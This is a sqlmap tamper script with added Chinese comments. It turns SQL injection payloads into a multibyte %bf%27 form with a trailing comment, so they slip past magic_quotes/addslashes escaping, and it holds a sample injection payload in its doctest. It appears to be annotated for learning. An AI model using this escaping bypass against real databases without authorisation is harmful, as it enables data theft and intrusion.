#!/usr/bin/env python
#coding=utf-8
"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    使用多字节组合%bf%27替换引号(')并在最后添加--注释（使其工作）
    
     笔记：
         *有助于绕过magic_quotes/addslashes功能

     参考：
         * http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string

    >>> tamper("1' AND 1=1")
    '1%bf%27-- '
    """

    retVal = payload

    if payload:
        found = False
        retVal = ""

        for i in xrange(len(payload)):
            if payload[i] == '\'' and not found:
                retVal += "%bf%27"
                found = True
            else:
                retVal += payload[i]
                continue

        if found:
            _ = re.sub(r"(?i)\s*(AND|OR)[\s(]+([^\s]+)\s*(=|LIKE)\s*\2", "", retVal)
            """
            r   表示字符串为非转义的原始字符串，让编译器忽略反斜杠，也就是忽略转义字符。
            ?i  IGNORECASE，忽略大小写的匹配模式
            \s*  \s 匹配任意空白字符，等价于[\t\n\r\f]; 
                  * 匹配前一个字符0或多次，合起来就是匹配多个空白字符。
            (AND|OR)分组，默认为捕获，即被分组的内容可以被单独取出，
            默认每个分组有个索引，从 1 开始，按照"("的顺序决定索引值
            [\s(]+匹配空白字符和左括号
            ([^\s]+)不匹任何配空白字符
            \s*
            (=|LIKE)以‘ | ’连接，表示只要满足其中之一就可以匹配
            \s*
            \2匹配第二个分组的内容
            """
            if _ != retVal: # _:'1%bf%27'
                retVal = _
                retVal += "-- "
            elif not any(_ in retVal for _ in ('#', '--', '/*')):
                retVal += "-- "
    return retVal

"""
re.sub定义：

sub(pattern, repl, string, count=0, flags=0) 

主要的意思为：对字符串string按照正则表达式pattern，将string的匹配项替换成字符串repl。 

公式解析： 

pattern为表示正则中的模式字符串，

repl为replacement，被替换的内容，repl可以是字符串，也可以是函数。 

string为正则表达式匹配的内容。 

count：由于正则表达式匹配到的结果是多个，
使用count来限定替换的个数（顺序为从左向右），默认值为0，替换所有的匹配到的结果。 

flags是匹配模式，可以使用按位或’|’表示同时生效，也可以在正则表达式字符串中指定。

举例：

>import re
>re.sub(r'\w+','10',"ji 43 af,geq",2,flags=re.I)
'10 10 af,geq'

详解：首先导入re模块，使用re.sub函数。

r’\w+’为正则表达式，匹配英文单词或数字。

’10’为被替换的内容

”ji 43 af,geq”为re匹配的字符串内容

count为2表示只替换前两个

flags=re.I 忽略大小写。 
"""